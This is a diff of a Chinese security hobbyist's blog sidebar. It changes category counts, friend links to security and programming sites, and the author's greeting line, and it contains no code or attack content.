href="/categories/杂七杂八/工具/">工具</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">27</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/CMS/">CMS</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/XSS/">XSS</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/其他/">其他</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/工具/">工具</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/提权/">提权</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/注入/">注入</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/笔记/">笔记</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/资源/">资源</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/">编程开发</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/编程开发/javascript/">javascript</a><span class="category-list-count">2</span></li></ul></li></ul>
 </div>
 
 
   
-<div class="tagslist">
-	<p class="asidetitle">标签</p>
-		<ul class="clearfix">
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-			
-		
-		</ul>
-</div>
-
 
   <div class="linkslist">
   <p class="asidetitle">友情链接</p>
@@ -461,7 +783,61 @@
         
           <li>
             
-            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            	<a href="https://dillinger.io" target="_blank" title="在线看makedown编译出的效果">makedown</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://mochazz.github.io" target="_blank" title="一个审计大佬的博客">审计</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.php.cn/course/74.html" target="_blank" title="php官方网站">php</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://blog.51cto.com/simeon" target="_blank" title="一个经常发布资源大佬的博客">资源</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.liaoxuefeng.com" target="_blank" title="学习python的个人博客">python</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.kanxue.com" target="_blank" title="二进制安全学习窝">看雪</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="www.secquan.org" target="_blank" title="常混的论坛">圈子</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.2cto.com" target="_blank" title="各种渗透书籍随便挑">红黑联盟</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.cnblogs.com" target="_blank" title="一个内网大佬的博客">linuxsec</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.runoob.com" target="_blank" title="学习各种编程脚本的好地方">W3C</a>
             
           </li>
         
@@ -493,7 +869,7 @@
 	
 	
 	<section class="info">
-		<p> Hello ,I&#39;m Larry Page in Google. <br/>
+		<p> Hello ,I&#39;m Bug`小虫 Page in Google. <br/>
 			This is my blog,believe it or not.</p>
 	</section>
 	 
